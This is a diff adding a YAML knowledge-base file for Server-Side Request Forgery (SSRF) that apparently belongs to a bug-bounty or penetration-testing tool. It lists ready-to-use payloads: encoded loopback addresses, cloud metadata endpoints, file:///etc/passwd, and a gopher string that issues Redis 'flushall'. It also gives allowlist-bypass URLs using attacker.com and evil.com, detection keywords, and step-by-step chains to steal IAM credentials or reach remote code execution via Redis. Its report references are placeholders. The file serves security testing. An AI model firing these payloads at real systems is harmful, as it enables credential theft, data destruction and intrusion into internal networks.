@@ -1,0 +1,121 @@
+name: Server-Side Request Forgery (SSRF)
+description: >
+  SSRF allows an attacker to induce the server to make HTTP requests to
+  arbitrary destinations, often bypassing firewalls.
+
+basic_payloads:
+  - "http://127.0.0.1:80"
+  - "http://localhost:80"
+  - "http://[::1]:80"
+  - "http://0.0.0.0:80"
+  - "http://0:80"
+  - "http://2130706433:80"
+  - "http://0x7f000001:80"
+  - "http://017700000001:80"
+  - "http://internal-service:8080"
+  - "https://169.254.169.254/latest/meta-data/"
+  - "http://metadata.google.internal"
+  - "http://100.100.100.200/latest/meta-data/"
+  - "file:///etc/passwd"
+  - "dict://127.0.0.1:6379/info"
+  - "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall"
+
+bypass_techniques:
+  - name: DNS Rebinding
+    description: Use DNS rebinding to bypass allowlists
+    payloads:
+      - "http://1e100.net:80"
+      - "http://rebind.example.com:80"
+
+  - name: Redirect Bypass
+    description: Use open redirects to reach internal networks
+    payloads:
+      - "http://attacker.com/redirect?url=http://169.254.169.254"
+      - "http://legit.com/next?url=http://localhost:8080/admin"
+
+  - name: IPv6 Shortcut
+    description: Bypass IP-based allowlists using IPv6 representations
+    payloads:
+      - "http://[::ffff:127.0.0.1]:80"
+      - "http://[::1]:80"
+
+  - name: Decimal/Hex Obfuscation
+    description: Use alternative IP representations
+    payloads:
+      - "http://2130706433:80"
+      - "http://0x7f000001:80"
+      - "http://017700000001:80"
+
+  - name: DNS Resolution Bypass
+    description: Use custom DNS to resolve to internal IPs
+    payloads:
+      - "http://internal.app:8080"
+      - "http://kubernetes.default.svc:443"
+
+  - name: URL Parser Confusion
+    description: Exploit differences between URL parsers
+    payloads:
+      - "http://127.0.0.1:80@evil.com"
+      - "http://evil.com#@127.0.0.1"
+      - "http://evil.com\\@127.0.0.1"
+
+  - name: Protocol Smuggling
+    description: Use unexpected URI schemes to access internal services
+    payloads:
+      - "file:///etc/passwd"
+      - "dict://127.0.0.1:6379"
+      - "gopher://127.0.0.1:6379"
+      - "ftp://internal-server:21"
+
+detection_patterns:
+  - "ssrf"
+  - "fetch url"
+  - "webhook"
+  - "callback url"
+  - "url import"
+  - "load url"
+  - "metadata"
+  - "internal ip"
+  - "169.254.169.254"
+  - "localhost"
+
+chain_templates:
+  - name: SSRF -> Cloud Metadata -> Credential Theft
+    description: Exploit SSRF to access cloud provider metadata endpoints for credential theft
+    requirements: [ssrf, cloud_hosted]
+    steps:
+      - Confirm outbound HTTP capability
+      - "Request cloud metadata endpoint (AWS: 169.254.169.254, GCP: metadata.google.internal)"
+      - Extract IAM credentials from metadata response
+      - Use stolen credentials for cloud access
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: SSRF -> Internal Service Scan
+    description: Use SSRF to map internal network services and find vulnerable endpoints
+    requirements: [ssrf]
+    steps:
+      - Confirm SSRF with callback listener
+      - Probe internal IP ranges (10.x, 172.16-31.x, 192.168.x)
+      - Identify internal services from response content
+      - Exploit internal service vulnerabilities
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: SSRF -> Redis/Gopher -> RCE
+    description: Use gopher protocol to interact with internal Redis and achieve RCE
+    requirements: [ssrf, gopher_supported, redis_internal]
+    steps:
+      - Verify SSRF can use gopher:// protocol
+      - Craft gopher payload for Redis command injection
+      - Write SSH key to Redis server
+      - SSH into internal server
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "SSRF in image URL parameter"
+    technique: "Basic SSRF to metadata endpoint"
+    severity: "high"
+  - report_id: "XXXXX"
+    title: "Blind SSRF to internal port scan"
+    technique: "Blind SSRF via HTTP callback"
+    severity: "medium"
